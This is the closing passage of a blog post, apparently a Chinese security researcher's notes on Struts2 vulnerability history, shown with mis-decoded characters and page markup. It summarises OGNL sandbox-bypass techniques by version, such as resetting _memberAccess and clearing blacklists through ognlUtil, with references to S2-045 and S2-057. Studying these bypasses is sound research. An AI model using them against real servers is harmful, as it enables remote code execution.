<li>struts2 2.3.20ä¹‹å‰ï¼Œè™½ç„¶ä¸èƒ½æ”¹<code>allowStaticMethodAccess</code>ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°çš„æ–¹å¼ç»•è¿‡ï¼›2.3.20ä¹‹åï¼Œå¢åŠ äº†é»‘åå•</li>
<li>struts2 2.3.29ä¹‹å‰ï¼Œé€šè¿‡<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`è¿™ç§æ–¹å¼åˆå§‹åŒ–ï¼Œæ¸…ç©ºé»‘åå•ï¼›2.3.29ä¹‹åï¼Œæ–°å¢äº†é»‘åå•ï¼Œé™åˆ¶äº†è¿™ç§æ–¹å¼çš„æ‰§è¡Œ</li>
<li>struts2 2.3.34/2.5.16ä¹‹å‰ï¼Œé€šè¿‡containerå®ä¾‹åŒ–<code>ognlUtil</code>ï¼Œæ¸…ç©ºé»‘åå•ï¼Œè¯¦ç»†è§S2-045ï¼›ä¹‹åç¦æ­¢äº†context.mapçš„è®¿é—®å’ŒexcludedClassesä¸å¯å˜ï¼Œä¸èƒ½é€šè¿‡clearæ¸…æ¥š</li>
<li>struts2 2.5.17ä¹‹å‰ï¼Œé€šè¿‡requestä¸­è·å–contextï¼Œç»•è¿‡context.mapç¦æ­¢è®¿é—®çš„é™åˆ¶ï¼Œè¯¦ç»†è§S2-057ï¼›ä¹‹åæ–°å¢äº†é»‘åå•ï¼Œå®Œå…¨ç¦æ­¢é€šè¿‡ognlçš„åŒ…æ¥å¯¹stackåšæ“ä½œ</li>
<li>åç»­å‡ ä¸ªç‰ˆæœ¬ä¹Ÿæ›´æ–°äº†å¾ˆå¤šå®‰å…¨æªæ–½ï¼Œå…·ä½“è§lucifaerå¸ˆå‚…çš„æ–‡ç« </li>
</ol>
<p>åœ¨åˆ†æå®Œstruts2ä¹‹åï¼Œä¹Ÿæ”¹å˜äº†å¯¹å¾ˆæœ‰åçš„æ¼æ´çš„æ„Ÿå®˜ï¼Œä»¥å‰æ€»è§‰å¾—strutsæ¼æ´éƒ½æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œä½†æ˜¯ç°åœ¨æƒ³æƒ³æœ‰ç²¾å½©å¤æ‚çš„åœ°æ–¹ä¹Ÿä¼šæœ‰å¾ˆå‚»çš„åœ°æ–¹ã€‚</p>
<p>ä¸èƒ½å¯¹è¿˜æ²¡æœ‰åˆ†æè¿‡çš„æ¡†æ¶æˆ–è€…åº”ç”¨æŒæœ‰ç•æƒ§ä¹‹å¿ƒï¼Œå…±å‹‰XD</p>

  	</div>
	  
	  <div class="article-tags tags">
      
        <a href="/tags/vul/">vul</a>
      
	  </div>
    

	
		<div class="art-item-footer">
				
				
					<span class="art-item-right">nextï¼š<a href="/2020/04/18/talk-about-xstream-deserialization/" rel="next"  title="ã€notesã€‘å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´">
						ã€notesã€‘å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´
					</a><i class="icon icon-chevron-thin-right"></i></span>
				
		</div>
	
	</section>
	
		<section id="comments">
			<div id="disqus_thread"></div>
		</section>
	
</article>
<script>
	window.subData = {
		title: 'ã€notesã€‘struts2å†å²æ¼æ´åˆ†æ',
		tools: true
	}
</script>

      </div>
      <aside class='l_side'>
        
  <section class='m_widget about'>

<div class='header'>wh1t3p1g</div>
<div class='content'>
<div class='desc'>A Web ğŸ¶ &amp;&amp; Code Reviewer</div>
</div>
</section>

  <section class='m_widget links'>
<div class='header'>Links</div>
<div class='content'>
    <ul class="entry">
    
        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
            <div class='name'>orleven</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
            <div class='name'>warmeng</div>
        </a></li>
    
    </ul>
</div>
</section>

  <section class='m_widget categories'>
<div class='header'>Categories</div>
<div class='content'>
    
    <ul class="entry">
    
        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
    
        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>5</div></a></li>
    
        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>23</div></a></li>
    
    </ul>
    
</div>
</section>

  
<div class="m_widget tagcloud">
    <div class="header">Tags</div>
    <div class='content'>
        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18px; color: #2b2b2b">cms</a> <a href="/tags/cve/" style="font-size: 16px; color: #555">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 16px; color: #555">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a>
    </div>
</div>



      </aside>
      <script>setLoadingBarProgress(60);</script>
    </div>
  </div>
  <footer id="footer" class="clearfix">

	<div class="social-wrapper">
  	
      
        <a href="https://github.com/wh1t3p1g" class="social github"
          target="_blank" rel="external">
          <span class="icon icon-github"></span>
        </a>
      
        <a href="/atom.xml" class="social rss"
          target="_blank" rel="external">
          <span class="icon icon-rss"></span>
        </a>
      
    
  </div>
  
  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
  
</footer>


  <script>setLoadingBarProgress(80);</script>
  
<script>
  var disqus_shortname = '0kami';
  
  var disqus_url = 'http://blog.0kami.cn/2020/05/22/talk-about-struts2/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
<script src="/js/jquery.fitvids.js"></script>
<script>
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
  var ROOT = "/"||"/";
  if(!ROOT.endsWith('/'))ROOT += '/';
</script>
<script src="/js/search.js"></script>
<script src="/js/app.js"></script>


  <script>setLoadingBarProgress(100);</script>
</body>
</html>
